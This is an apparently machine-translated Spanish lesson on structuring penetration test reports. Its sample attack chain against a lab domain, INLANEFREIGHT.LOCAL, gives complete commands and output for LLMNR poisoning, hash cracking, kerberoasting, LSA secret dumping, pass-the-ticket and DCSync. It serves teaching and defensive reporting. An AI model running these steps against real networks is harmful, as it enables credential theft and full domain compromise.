# Componentes de un informe

---

Como se mencionó anteriormente, el informe es el principal entrega que un cliente está pagando cuando contrata a su empresa para realizar una prueba de penetración. El informe es nuestra oportunidad de mostrar nuestro trabajo durante la evaluación y proporcionar al cliente el mayor valor posible. Idealmente, el informe estará libre de datos e información extraños que "desorden" el informe o distraen de los problemas que estamos tratando de transmitir la imagen general de su postura de seguridad que estamos tratando de pintar. Todo en el informe debería tener una razón para estar allí, y no queremos abrumar al lector (¡por ejemplo, no pegar en más de 50 páginas de salida de consola!). En esta sección, cubriremos los elementos clave de un informe y cómo podemos estructurarlo mejor para mostrar nuestro trabajo y ayudar a nuestros clientes a priorizar la remediación.

---

## Priorizar nuestros esfuerzos

Durante una evaluación, especialmente las grandes, nos enfrentaremos a mucho "ruido" que debemos filtrar para enfocar mejor nuestros esfuerzos y priorizar los hallazgos. Como evaluadores, debemos revelar todo lo que encontramos, pero cuando se nos ocurre una tonelada de información a través de escaneos y enumeración, es fácil perderse o centrarnos en las cosas incorrectas y perder el tiempo y potencialmente perder problemas de alto impacto. Es por eso que es esencial que entendamos el resultado que producen nuestras herramientas, tengan pasos repetibles (como scripts u otras herramientas) para examinar todos estos datos, procesarlo y eliminar falsos positivos o problemas informativos que podrían distraernos del objetivo de la evaluación. La experiencia y un proceso repetible son clave para que podamos examinar todos nuestros datos y enfocar nuestros esfuerzos en hallazgos de alto impacto, como fallas de ejecución de código remoto (RCE) u otros que pueden conducir a una divulgación de datos confidencial. Vale la pena (y nuestro deber) informar hallazgos informativos, pero en lugar de pasar la mayor parte de nuestro tiempo validando estos problemas menores y no explotables, es posible que desee considerar consolidar algunas de ellas en las categorías que muestran al cliente que sabía que los problemas existían, pero no pudo explotarlos de manera significativa (EG, 35 variaciones diferentes de los problemas con los problemas SSL/TLS, un tonel de Dos. PHP, etc.).

Al comenzar en las pruebas de penetración, puede ser difícil saber qué priorizar, y podemos caer por los agujeros de conejo tratando de explotar un defecto que no existe o obtener una exploit de POC rota para que funcione. El tiempo y la experiencia ayudan aquí, pero también debemos apoyarnos en los miembros y mentores del equipo senior para ayudar. Algo en lo que puede perder medio día podría ser algo que hayan visto muchas veces y podría decirle rápidamente si es un falso positivo o vale la pena agotar. Incluso si no pueden darle una respuesta en blanco y negro realmente rápido, al menos pueden señalarlo en una dirección que le ahorra varias horas. Rodéate de personas que te sientas cómodo para pedir ayuda que no te haga sentir como un idiota si no sabes todas las respuestas.

---

## Escribir una cadena de ataque

La cadena de ataque es nuestra oportunidad de mostrar la fría cadena de explotación que tomamos para establecer un punto de apoyo, moverse lateralmente y comprometer el dominio. Puede ser un mecanismo útil para ayudar al lector a conectar los puntos cuando se usan múltiples hallazgos junto entre sí y obtener una mejor comprensión de por qué ciertos hallazgos tienen la calificación de gravedad que se asignan. Por ejemplo, un hallazgo particular por sí solo puede ser`medium-risk`pero, combinado con uno o dos otros problemas, podría elevarlo a`high-risk`, y esta sección es nuestra oportunidad de demostrar eso. Un ejemplo común es usar`Responder`para interceptar el tráfico NBT-NS/LLMNR y transmitirlo a los hosts donde la firma de SMB no está presente. Puede ser realmente interesante si se pueden incorporar algunos hallazgos que de otro modo parezcan intrascendentes, como usar una divulgación de información de algún tipo para ayudarlo a guiarlo a través de un LFI para leer un archivo de configuración interesante, iniciar sesión en una aplicación externa y aprovechar la funcionalidad para obtener la ejecución de código remoto y un punto de apoyo dentro de la red interna.

Hay múltiples formas de presentar esto, y su estilo puede diferir, pero caminemos por un ejemplo. Comenzaremos con un resumen de la cadena de ataque y luego caminaremos por cada paso junto con la salida de comandos de soporte y capturas de pantalla para mostrar la cadena de ataque lo más claramente posible. Una ventaja aquí es que podemos reutilizar esto como evidencia de nuestros hallazgos individuales para que no tengamos que formatear las cosas dos veces y podemos copiarlas/pegarlas en el hallazgo relevante.

Comencemos. Aquí asumiremos que fuimos contratados para realizar una prueba de penetración interna contra la compañía`Inlanefreight`con una VM dentro de la infraestructura del cliente o en su oficina en nuestra computadora portátil conectada a un puerto Ethernet. Para nuestros propósitos, esta evaluación simulada se realizó desde un`non-evasive`punto de vista con un`grey box`Enfoque, lo que significa que el cliente no intentaba interferir activamente con las pruebas y solo proporcionaba rangos de redes en el alcance y nada más. Pudimos comprometer el dominio interno`INLANEFREIGHT.LOCAL`durante nuestra evaluación.

Nota: También se puede encontrar una copia de esta cadena de ataque en el documento de informe de muestra adjunto.

---

## Muestra de cadena de ataque - inlanefreight. Prueba de penetración interna local

Durante la prueba de penetración interna realizada contra InlaneFreight, el probador ganó un punto de apoyo en la red interna, se movió lateralmente y finalmente comprometió el`INLANEFREIGHT.LOCAL`Dominio de Active Directory. El siguiente tutorial ilustra los pasos que se realizan para pasar de un usuario anónimo no autenticado en la red interna al acceso a nivel de administración del dominio. La intención de esta cadena de ataque es demostrar infructuoso el impacto de cada vulnerabilidad que se muestra en este informe y cómo encajan para demostrar el riesgo general para el entorno del cliente y ayudar a priorizar los esfuerzos de remediación (es decir, parchear dos fallas rápidamente podría romper la cadena de ataque mientras la compañía trabaja para remediar todos los problemas reportados). Si bien otros hallazgos que se muestran en este informe podrían aprovecharse para obtener un nivel similar de acceso, esta cadena de ataque muestra la ruta inicial de menor resistencia tomada por el probador para lograr el compromiso del dominio.

1. El probador utilizó el[Respondedor](https://github.com/lgandx/Responder)herramienta para obtener un hash de contraseña NTLMV2 para un usuario de dominio,`bsmith`.
    
2. Este hash de contraseña fue descifrado correctamente fuera de línea utilizando el[Hashcat](https://github.com/hashcat/hashcat)herramienta para revelar la contraseña ClearText del usuario, que otorgó un punto de apoyo al`INLANEFREIGHT.LOCAL`dominio, pero sin más privilegios que un usuario de dominio estándar.
    
3. El probador luego corrió el[Bloodhound.py](https://github.com/fox-it/BloodHound.py)herramienta, una versión de Python del popular[Sharphound](https://github.com/BloodHoundAD/BloodHound/tree/master/Collectors)Herramienta de recolección para enumerar el dominio y crear representaciones visuales de las rutas de ataque. Tras la revisión, el probador descubrió que existían múltiples usuarios privilegiados en el dominio configurado con nombres principales del servicio (SPN), que se pueden aprovechar para realizar un ataque de querberoasting y recuperar boletos de Kerberos TGS para las cuentas que se pueden descifrar fuera de línea.`Hashcat`Si se establece una contraseña débil. Desde aquí, el probador usó el[GetUserspns.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/GetUserSPNs.py)herramienta para llevar a cabo un ataque de querberoasting objetivo contra el`mssqlsvc`cuenta, habiendo encontrado que el`mssqlsvc`La cuenta tenía derechos de administrador local sobre el anfitrión`SQL01.INLANEFREIGHT.LOCAL`que era un objetivo interesante en el dominio.
    
4. El probador descifró con éxito la contraseña de esta cuenta fuera de línea, revelando el valor de ClearText.
    
5. El probador autenticado al host`SQL01.INLANEFREIGHT.LOCAL`y recuperó una contraseña de ClearText del registro del host descifrando los secretos de LSA para una cuenta (`srvadmin`), que fue configurado para Autologon.
    
6. Este`srvadmin`La cuenta tenía derechos de administrador local sobre todos los servidores (aparte de los controladores de dominio) en el dominio, por lo que el probador inició sesión en el`MS01.INLANEFREIGHT.LOCAL`host y recuperó un boleto Kerberos TGT para un usuario iniciado,`pramirez`. Este usuario era parte del`Tier I Server Admins`Grupo, que otorgó los derechos DCSYNC de la cuenta sobre el objeto de dominio. Este ataque se puede utilizar para recuperar el hash de contraseña NTLM para cualquier usuario en el dominio, lo que resulta en un compromiso y persistencia del dominio a través de un boleto de oro.
    
7. El probador usó el[Rubeo](https://github.com/GhostPack/Rubeus)herramienta para extraer el boleto Kerberos TGT para el`pramirez`usuario y realizar un ataque de pase de boleto para autenticarse como este usuario.
    
8. Finalmente, el probador realizó un ataque DCSYNC después de autenticarse con éxito con esta cuenta de usuario a través de la[Mimikatz](https://github.com/gentilkiwi/mimikatz)herramienta, que terminó en compromiso de dominio.
    

#### Los pasos detallados de reproducción para esta cadena de ataque son los siguientes:

Al conectarse a la red, el probador inició la herramienta de respuesta y pudo capturar un hash de contraseña para el`bsmith`Usuario al falsificar el tráfico NBT-NS/LLMNR en el segmento de red local.

#### Respondedor

  Componentes de un informe

```shell-session
xnoxos@htb[/htb]$  sudo responder -I eth0 -wrfv

                                         __
  .----.-----.-----.-----.-----.-----.--|  |.-----.----.
  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|
  |__| |_____|_____|   __|_____|__|__|_____||_____|__|
                   |__|

           NBT-NS, LLMNR & MDNS Responder 3.0.6.0

 <SNIP>

[+] Generic Options:
    Responder NIC              [eth0]
    Responder IP               [192.168.195.168]
    Challenge set              [random]
    Don't Respond To Names     ['ISATAP']

[+] Current Session Variables:
    Responder Machine Name     [WIN-TWWXTGD94CV]
    Responder Domain Name      [3BKZ.LOCAL]
    Responder DCE-RPC Port     [47032]

[+] Listening for events...

<SNIP>

[SMB] NTLMv2-SSP Client   : 192.168.195.205
[SMB] NTLMv2-SSP Username : INLANEFREIGHT\bsmith
[SMB] NTLMv2-SSP Hash     : bsmith::INLANEFREIGHT:7ecXXXXXX98ebc:73D1B2XXXXXXXXXXX45085A651:010100000000000000B588D9F766D801191BB2236A5FAAA50000000002000800330042004B005A0001001E00570049004E002D005400570057005800540047004400390034004300560004003400570049004E002D00540057005700580054004700440039003400430056002E00330042004B005A002E004CXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX2E004C004F00430041004C000700080000B588D9F766D801060004000200000008003000300000000000000001000000002000002CAE5BF3BB1FD2F846A280AEF43A8809C15207BFCB4DF5A580BA1B6FCAF6BBCE0A001000000000000000000000000000000000000900280063006900660073002F003100390032002E003100360038002E003100390035002E00310036003800000000000000000000000000

<SNIP>
```

El probador tuvo éxito en "descifrar" este hash de contraseña fuera de línea utilizando la herramienta hashcat y recuperar el valor de la contraseña de ClearText, lo que otorga un punto de apoyo para enumerar el dominio Active Directory.

#### Hashcat

  Componentes de un informe

```shell-session
xnoxos@htb[/htb]$ hashcat -m 5600 bsmith_hash /usr/share/wordlists/rockyou.txt 

hashcat (v6.1.1) starting...

<SNIP>

Dictionary cache hit:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344385
* Bytes.....: 139921507
* Keyspace..: 14344385

BSMITH::INLANEFREIGHT:7eccd965c4b98ebc:73d1b2c8c5f9861eefd31bb45085a651:010100000000000000b588d9f766d801191bb2236a5faaa50000000002000800330042004b005a0001001e00570049004e002d00540057005700580054004700440039003400430056XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX004700440039003400430056002e00330042004b005a002e004c004f00430041004c0003001400330042004b005a002e004c004f00430041004c0005001400330042004b005a002e004c004f00430041004c000700080000b588d9f766d801060004000200000008003000300000000000000001000000002000002cae5bf3bb1fd2f846a280aef43a8809c15207bfcb4df5a580ba1b6fcaf6bbce0a001000000000000000000000000000000000000900280063006900660073002f003100390032002e003100360038002e003100390035002e00310036003800000000000000000000000000:<REDACTED>
```

El probador procedió a enumerar las cuentas de los usuarios configuradas con nombres principales de servicio (SPN) que pueden estar sujetos a un ataque de keberoasting. Esta técnica de escalamiento de movimiento/privilegio de privilegio se dirige a SPNS (identificadores únicos que Kerberos usa para asignar una instancia de servicio a una cuenta de servicio). Cualquier usuario de dominio puede solicitar un boleto de Kerberos para cualquier cuenta de servicio en el dominio, y el ticket está encriptado con el hash de contraseña NTLM de la cuenta de servicio, que potencialmente puede "agrietarse" fuera de línea para revelar el valor de la contraseña ClearText de la cuenta.

#### GetUserspns

  Componentes de un informe

```shell-session
xnoxos@htb[/htb]$ GetUserSPNs.py INLANEFREIGHT.LOCAL/bsmith -dc-ip 192.168.195.204

Impacket v0.9.24.dev1+20210922.102044.c7bc76f8 - Copyright 2021 SecureAuth Corporation

Password:
ServicePrincipalName                         Name       MemberOf  PasswordLastSet             LastLogon  Delegation 
-------------------------------------------  ---------  --------  --------------------------  ---------  ----------
MSSQLSvc/SQL01.inlanefreight.local:1433      mssqlsvc             2022-05-13 16:52:07.280623  <never>               
MSSQLSvc/SQL02.inlanefreight.local:1433      sqlprod              2022-05-13 16:54:52.889815  <never>               
MSSQLSvc/SQL-DEV01.inlanefreight.local:1433  sqldev               2022-05-13 16:54:57.905315  <never>               
MSSQLSvc/QA001.inlanefreight.local:1433      sqlqa                2022-05-13 16:55:03.421004  <never>               
backupjob/veam001.inlanefreight.local        backupjob            2022-05-13 18:38:17.740269  <never>               
vmware/vc.inlanefreight.local                vmwaresvc            2022-05-13 18:39:10.691799  <never> 
```

Luego, el probador ejecutó la versión de Python de la popular herramienta de enumeración de Bloodhound Active Directory para recopilar información como usuarios, grupos, computadoras, ACL, membresía de grupo, propiedades de usuario y computadora, sesiones de usuario, acceso de administrador local y más. Estos datos se pueden importar a una herramienta GUI para crear representaciones visuales de las relaciones dentro del dominio y mapear las "rutas de ataque" que pueden usarse para moverse lateralmente o aumentar los privilegios dentro de un dominio.

#### Sabueso

  Componentes de un informe

```shell-session
xnoxos@htb[/htb]$ sudo bloodhound-python -u 'bsmith' -p '<REDACTED>' -d inlanefreight.local -ns 192.168.195.204 -c All

INFO: Found AD domain: inlanefreight.local
INFO: Connecting to LDAP server: DC01.INLANEFREIGHT.LOCAL
INFO: Found 1 domains
INFO: Found 1 domains in the forest
INFO: Found 503 computers
INFO: Connecting to LDAP server: DC01.INLANEFREIGHT.LOCAL
INFO: Found 652 users

<SNIP>
```

El probador utilizó esta herramienta para verificar los privilegios de cada una de las cuentas SPN enumeradas en pasos anteriores y notó que solo el`mssqlsvc`La cuenta tenía privilegios más allá de un usuario de dominio estándar. Esta cuenta tenía acceso al administrador local sobre el`SQL01`anfitrión. Los servidores SQL a menudo son objetivos de alto valor en un dominio, ya que tienen credenciales privilegiadas, datos confidenciales o incluso pueden tener un usuario más privilegiado iniciado.

![image](https://academy.hackthebox.com/storage/modules/162/bh_mssqlsvc.png)

Luego, el probador realizó un ataque de kerberoasting objetivo para recuperar el boleto de Kerberos TGS para el`mssqlsvc`cuenta de servicio.

#### GetUserspns

  Componentes de un informe

```shell-session
xnoxos@htb[/htb]$ GetUserSPNs.py INLANEFREIGHT.LOCAL/bsmith -dc-ip 192.168.195.204 -request-user mssqlsvc

Impacket v0.9.24.dev1+20210922.102044.c7bc76f8 - Copyright 2021 SecureAuth Corporation

Password:
ServicePrincipalName                     Name      MemberOf  PasswordLastSet             LastLogon  Delegation 
---------------------------------------  --------  --------  --------------------------  ---------  ----------
MSSQLSvc/SQL01.inlanefreight.local:1433  mssqlsvc            2022-05-13 16:52:07.280623  <never>               


$krb5tgs$23$*mssqlsvc$INLANEFREIGHT.LOCAL$INLANEFREIGHT.LOCAL/mssqlsvc*$2c43cf68f965432014279555d1984740$5a3988485926feab23d73ad500b2f9b7698d46e91f9790348dec2867e5b1733cd5df326f346a6a3450dbd6c122f0aa72b9feca4ba8318463c782936c51da7fa62d5106d795b4ff0473824cf5f85101fd603d0ea71edb11b8e9780e68c2ce096739fff62dbf86a67b53a616b7f17fb3c164d8db0a7dc0c60ad48fb21aacfeecf36f2e17ca4e339ead4a8987be84486460bf41368426ef754930cfd4b92fee996e2f2f35796c44ba798c2a0f4184c9dc946a5009a515b2469d0e81f8b45360ba96f8f8fadb4678877d6c88b21e54804068bfbdb5c3ac393c5efcdf68286ed31bfa25f8ece180f1e3aaa4388886ed629595a6b95c68fc843c015669d57e950116c7b3988400d850e415059023e1cd27a2d6a897185716b806eba383bc5a0715884103212f2cc6e680a5409324b25440a015256fcce0be87a4ed348152b8d4b7e571c40ccb9c295c8cf18e <SNIP>
```

El probador tuvo éxito en "descifrar" esta contraseña fuera de línea para revelar su valor ClearText.

#### Hashcat

  Componentes de un informe

```shell-session
xnoxos@htb[/htb]$ $hashcat -m 13100 mssqlsvc_tgs /usr/share/wordlists/rockyou.txt 

hashcat (v6.1.1) starting...

<SNIP>

$krb5tgs$23$*mssqlsvc$INLANEFREIGHT.LOCAL$INLANEFREIGHT.LOCAL/mssqlsvc*$2c43cf68f965432014279555d1984740$5a<SNIP>:<REDACTED>
```

Esta contraseña podría usarse para acceder al`SQL01`anfitrión de forma remota y recupere un conjunto de credenciales de ClearText del registro para el`srvadmin`cuenta.

#### Crackmapexec

  Componentes de un informe

```shell-session
xnoxos@htb[/htb]$ crackmapexec smb 192.168.195.220 -u mssqlsvc -p <REDACTED> --lsa

SMB         192.168.195.220 445    SQL01            [*] Windows 10.0 Build 17763 (name:SQL01) (domain:INLANEFREIGHT.LOCAL) (signing:False) (SMBv1:False)
SMB         192.168.195.220 445    SQL01            [+] INLANEFREIGHT.LOCAL\mssqlsvc:<REDACTED> 
SMB         192.168.195.220 445    SQL01            [+] Dumping LSA secrets
SMB         192.168.195.220 445    SQL01            INLANEFREIGHT.LOCAL/Administrator:$DCC2$10240#Administrator#7bd0f186CCCCC450c5e8cb53228cc0
SMB         192.168.195.220 445    SQL01            INLANEFREIGHT.LOCAL/srvadmin:$DCC2$10240#srvadmin#ef393703f3fabCCCCCa547caffff5f

<SNIP>

SMB         192.168.195.220 445    SQL01            INLANEFREIGHT\srvadmin:<REDACTED>

<SNIP>

SMB         192.168.195.220 445    SQL01            [+] Dumped 10 LSA secrets to /home/mrb3n/.cme/logs/SQL01_192.168.195.220_2022-05-14_081528.secrets and /home/mrb3n/.cme/logs/SQL01_192.168.195.220_2022-05-14_081528.cached
```

Usando estas credenciales, el probador inició sesión en el`MS01`host a través de un escritorio remoto (RDP) y señaló que otro usuario,`pramirez`, también se registró actualmente.

#### Iniciado usuarios

  Componentes de un informe

```cmd-session
C:\htb> query user

 USERNAME              SESSIONNAME        ID  STATE   IDLE TIME  LOGON TIME
 pramirez              rdp-tcp#1           2  Active          3  5/14/2022 8:21 AM
>srvadmin              rdp-tcp#2           3  Active          .  5/14/2022 8:24 AM
```

El probador verificó la herramienta Bloodhound y notó que este usuario podría realizar el ataque DCSYNC, una técnica para robar la base de datos de contraseña de Active Directory aprovechando un protocolo utilizado por los controladores de dominio a los datos de dominio replicados. Este ataque se puede usar para recuperar hash de contraseña NTLM para cualquier usuario en el dominio.

![image](https://academy.hackthebox.com/storage/modules/162/bh_pramirez.png)

Después de conectarse, el probador utilizó la herramienta Rubeus para ver todos los boletos de Kerberos actualmente disponibles en el sistema y notó que los boletos para el`pramirez`El usuario estuvo presente.

#### Rubeo

  Componentes de un informe

```powershell-session
PS C:\htb> .\Rubeus.exe triage

   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.0.2


Action: Triage Kerberos Tickets (All Users)

[*] Current LUID    : 0x256aef

 ------------------------------------------------------------------------------------------------------------------------
 | LUID     | UserName                       | Service                                           | EndTime              |
 ------------------------------------------------------------------------------------------------------------------------
 | 0x256aef | srvadmin @ INLANEFREIGHT.LOCAL | krbtgt/INLANEFREIGHT.LOCAL                        | 5/14/2022 6:24:19 PM |
 | 0x256aef | srvadmin @ INLANEFREIGHT.LOCAL | LDAP/DC01.INLANEFREIGHT.LOCAL/INLANEFREIGHT.LOCAL | 5/14/2022 6:24:19 PM |
 | 0x1a8b19 | pramirez @ INLANEFREIGHT.LOCAL | krbtgt/INLANEFREIGHT.LOCAL                        | 5/14/2022 6:21:35 PM |
 | 0x1a8b19 | pramirez @ INLANEFREIGHT.LOCAL | ProtectedStorage/DC01.INLANEFREIGHT.LOCAL         | 5/14/2022 6:21:35 PM |
 | 0x1a8b19 | pramirez @ INLANEFREIGHT.LOCAL | cifs/DC01.INLANEFREIGHT.LOCAL                     | 5/14/2022 6:21:35 PM |
 | 0x1a8b19 | pramirez @ INLANEFREIGHT.LOCAL | cifs/DC01                                         | 5/14/2022 6:21:35 PM |
 | 0x1a8b19 | pramirez @ INLANEFREIGHT.LOCAL | LDAP/DC01.INLANEFREIGHT.LOCAL/INLANEFREIGHT.LOCAL | 5/14/2022 6:21:35 PM |
 | 0x1a8ade | pramirez @ INLANEFREIGHT.LOCAL | krbtgt/INLANEFREIGHT.LOCAL                        | 5/14/2022 6:21:35 PM |
 | 0x1a8ade | pramirez @ INLANEFREIGHT.LOCAL | LDAP/DC01.INLANEFREIGHT.LOCAL/INLANEFREIGHT.LOCAL | 5/14/2022 6:21:35 PM 
```

Luego, el probador utilizó esta herramienta para recuperar el boleto Kerberos TGT para este usuario, que luego se puede utilizar para realizar un ataque de "pase el boleto" y usar el boleto TGT robado para acceder a los recursos en el dominio.

  Componentes de un informe

```powershell-session
PS C:\htb> .\Rubeus.exe dump /luid:0x1a8b19 /service:krbtgt

   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.0.2


Action: Dump Kerberos Ticket Data (All Users)

[*] Target service  : krbtgt
[*] Target LUID     : 0x1a8b19
[*] Current LUID    : 0x256aef

  UserName                 : pramirez
  Domain                   : INLANEFREIGHT
  LogonId                  : 0x1a8b19
  UserSID                  : S-1-5-21-1666128402-2659679066-1433032234-1108
  AuthenticationPackage    : Negotiate
  LogonType                : RemoteInteractive
  LogonTime                : 5/14/2022 8:21:35 AM
  LogonServer              : DC01
  LogonServerDNSDomain     : INLANEFREIGHT.LOCAL
  UserPrincipalName        : pramirez@INLANEFREIGHT.LOCAL


    ServiceName              :  krbtgt/INLANEFREIGHT.LOCAL
    ServiceRealm             :  INLANEFREIGHT.LOCAL
    UserName                 :  pramirez
    UserRealm                :  INLANEFREIGHT.LOCAL
    StartTime                :  5/15/2022 3:51:35 AM
    EndTime                  :  5/15/2022 1:51:35 PM
    RenewTill                :  5/21/2022 8:21:35 AM
    Flags                    :  name_canonicalize, pre_authent, initial, renewable, forwardable
    KeyType                  :  aes256_cts_hmac_sha1
    Base64(key)              :  3g/++VoJZ4ipbExARBCKK960cN+3juTKNHiQ8XpHL/k=
    Base64EncodedTicket   :

      doIFZDCCBWCgAwIBBaEDAgEWooIEVDCCBFBhgg<SNIP>

   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.0.2


[*] Action: Import Ticket
[+] Ticket successfully imported!
```

El usuario realizó el ataque de pase de boletos y se autenticó con éxito como el`pramirez`usuario.

  Componentes de un informe

```powershell-session
PS C:\htb> .\Rubeus.exe ptt /ticket:doIFZDCCBWCgAwIBBaEDAgEWo<SNIP>
```

Esto fue confirmado usando el`klist`Comando para ver los boletos de Kerberos en caché en la sesión actual.

#### Boletos de Kerberos en caché

  Componentes de un informe

```powershell-session
PS C:\htb> klist

Current LogonId is 0:0x256d1d

Cached Tickets: (1)

#0>     Client: pramirez @ INLANEFREIGHT.LOCAL
        Server: krbtgt/INLANEFREIGHT.LOCAL @ INLANEFREIGHT.LOCAL
        KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96
        Ticket Flags 0x40e10000 -> forwardable renewable initial pre_authent name_canonicalize
        Start Time: 5/15/2022 3:51:35 (local)
        End Time:   5/15/2022 13:51:35 (local)
        Renew Time: 5/21/2022 8:21:35 (local)
        Session Key Type: AES-256-CTS-HMAC-SHA1-96
        Cache Flags: 0x1 -> PRIMARY
        Kdc Called:
```

Luego, el probador utilizó este acceso para realizar un ataque DCSYNC y recuperar el hash de contraseña NTLM para la cuenta de administrador incorporada, que condujo al acceso a nivel de administración empresarial a través del dominio.

#### Mimikatz

  Componentes de un informe

```powershell-session
PS C:\htb> .\mimikatz.exe

  .#####.   mimikatz 2.2.0 (x64) #19041 Aug 10 2021 17:19:53
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/

mimikatz # lsadump::dcsync /user:INLANEFREIGHT\administrator
[DC] 'INLANEFREIGHT.LOCAL' will be the domain
[DC] 'DC01.INLANEFREIGHT.LOCAL' will be the DC server
[DC] 'INLANEFREIGHT\administrator' will be the user account
[rpc] Service  : ldap
[rpc] AuthnSvc : GSS_NEGOTIATE (9)
[DC] ms-DS-ReplicationEpoch is: 1

Object RDN           : Administrator

** SAM ACCOUNT **

SAM Username         : Administrator
Account Type         : 30000000 ( USER_OBJECT )
User Account Control : 00010200 ( NORMAL_ACCOUNT DONT_EXPIRE_PASSWD )
Account expiration   :
Password last change : 2/12/2022 9:32:55 PM
Object Security ID   : S-1-5-21-1666128402-2659679066-1433032234-500
Object Relative ID   : 500

Credentials:
  Hash NTLM: e4axxxxxxxxxxxxxxxx1c88c2e94cba2
```

El probador confirmó este acceso autenticando a un controlador de dominio en el`INLANEFREIGHT.LOCAL`dominio.

#### Crackmapexec

  Componentes de un informe

```shell-session
xnoxos@htb[/htb]$ sudo crackmapexec smb 192.168.195.204 -u administrator -H e4axxxxxxxxxxxxxxxx1c88c2e94cba2

SMB         192.168.195.204 445    DC01             [*] Windows 10.0 Build 17763 (name:DC01) (domain:INLANEFREIGHT.LOCAL) (signing:True) (SMBv1:False)
SMB         192.168.195.204 445    DC01             [+] INLANEFREIGHT.LOCAL\administrator e4axxxxxxxxxxxxxxxx1c88c2e94cba2 
```

Con este acceso, fue posible recuperar los hash de contraseña NTLM para todos los usuarios en el dominio. El probador luego realizó el agrietamiento fuera de línea de estos hashes utilizando la herramienta hashcat. Se puede encontrar un análisis de contraseña de dominio que muestra varias métricas en los apéndices de este informe.

#### Dumping NTDS con SecretSdump

  Componentes de un informe

```shell-session
xnoxos@htb[/htb]$ secretsdump.py inlanefreight/administrator@192.168.195.204 -hashes ad3b435b51404eeaad3b435b51404ee:e4axxxxxxxxxxxxxxxx1c88c2e94cba2 -just-dc-ntlm

Impacket v0.9.24.dev1+20210922.102044.c7bc76f8 - Copyright 2021 SecureAuth Corporation

[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:e4axxxxxxxxxxxxxxxx1c88c2e94cba2:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cxxxxxxxxxx7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:4180f1f4xxxxxxxxxx0e8523771a8c:::
mssqlsvc:1106:aad3b435b51404eeaad3b435b51404ee:55a6c7xxxxxxxxxxxx2b07e1:::
srvadmin:1107:aad3b435b51404eeaad3b435b51404ee:9f9154fxxxxxxxxxxxxx0930c0:::
pramirez:1108:aad3b435b51404eeaad3b435b51404ee:cf3a5525ee9xxxxxxxxxxxxxed5c58:::

<SNIP>
```

---

## Escribir un fuerte resumen ejecutivo

El`Executive Summary`es una de las partes más importantes del informe. Como se mencionó anteriormente, nuestros clientes están pagando en última instancia por el informe entregado que tiene varios propósitos, además de mostrar debilidades y pasos de reproducción que pueden ser utilizados por equipos técnicos que trabajan en la remediación. Es probable que el informe sea visto en alguna parte por otras partes interesadas internas, como la auditoría interna, la gestión de seguridad de TI y TI, la gestión de nivel C e incluso la Junta Directiva. El informe puede usarse para validar los fondos del año anterior para InfosEC o para solicitar fondos adicionales para el año siguiente. Por esta razón, debemos asegurarnos de que haya contenido en el informe que las personas puedan entender fácilmente sin conocimiento técnico.

#### Conceptos clave

La audiencia prevista para el`Executive Summary`es típicamente la persona que será responsable de asignar el presupuesto para solucionar los problemas que descubrimos. Para bien o para mal, algunos de nuestros clientes probablemente han estado tratando de obtener fondos para solucionar los problemas presentados en el informe durante años y tienen la intención de usar el informe como municiones para finalmente hacer algunas cosas. Esta es nuestra mejor oportunidad para ayudarlos. Si perdemos a nuestra audiencia aquí y hay limitaciones presupuestarias, el resto del informe puede ser rápidamente inútil. Algunas cosas clave para asumir (que pueden o no ser verdad) para maximizar la efectividad del`Executive Summary`son:

- Debería ser obvio, pero esto debería escribirse para alguien que no sea técnico en absoluto. El barómetro típico para esto es "Si tus padres no pueden entender cuál es el punto, entonces debes intentarlo de nuevo" (suponiendo que tus padres no son Cisos o Sysadmins o algo por el estilo).
    
- El lector no hace esto todos los días. No saben qué hace Rubeo, qué significa la pulverización de contraseñas o cómo es posible que los boletos puedan otorgar diferentes boletos (o probablemente incluso qué es un boleto, aparte de un papel para ingresar a un concierto o un juego de pelota).
    
- Esta puede ser la primera vez que han pasado por una prueba de penetración.
    
- Al igual que el resto del mundo en la edad instantánea de gratificación, su capacidad de atención es pequeña. Cuando lo perdemos, es extraordinariamente poco probable que lo recuperemos.
    
- En la misma línea, a nadie le gusta leer algo donde tienen que buscar en Google lo que significan las cosas. Se llaman distracciones.
    

Hablemos sobre una lista de "hacer y no hacer" al escribir un`Executive Summary`.

#### Hacer

- `When talking about metrics, be as specific as possible.`- Palabras como "varios", "múltiples" y "pocos" son ambiguas y podrían significar 6 o 500. Los ejecutivos no van a cavar a través del informe de esta información, por lo que si va a hablar de esto, hágales saber lo que tiene; De lo contrario, vas a perder su atención. La razón más común por la que las personas no se comprometen con un número específico es dejarlo abierto en caso de que el consultor se perdiera uno. Puede hacer cambios menores en el idioma para dar cuenta de esto, como "Si bien puede haber casos adicionales de X, en el tiempo asignado a la evaluación, observamos 25 ocurrencias de X".
    
- `It's a summary. Keep it that way.`- Si escribió más de 1.5-2 páginas, probablemente haya sido demasiado detallado. Examine los temas sobre los que habló y determine si pueden colapsarse en categorías de nivel superior que podrían caer en políticas o procedimientos específicos.
    
